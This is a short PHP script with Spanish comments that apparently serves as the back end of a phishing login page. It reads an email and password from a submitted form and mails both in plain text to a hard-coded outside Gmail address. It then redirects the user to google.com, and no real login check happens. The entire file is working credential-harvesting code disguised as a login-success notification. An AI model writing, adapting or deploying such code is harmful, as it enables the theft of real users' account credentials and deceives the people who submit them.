<?php
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    // Recibe los datos del formulario
    $correo = $_POST["correo"];
    $contraseña = $_POST["contraseña"];

    // Aquí puedes incluir la lógica para verificar los datos ingresados

    // Si los datos son válidos, puedes enviar un correo electrónico
    $destinatario = "j00s3a1@gmail.com"; // Cambia esto por tu dirección de correo electrónico
    $asunto = "Inicio de sesión exitoso";
    $mensaje = "Se ha iniciado sesión correctamente con el correo: $correo y la contraseña: $contraseña";
    $cabeceras = "From: tu@email.com";

    // Envía el correo
    mail($destinatario, $asunto, $mensaje, $cabeceras);

    // Redirige a Google.com
    header("Location: https://www.google.com");
    exit;
}
?>
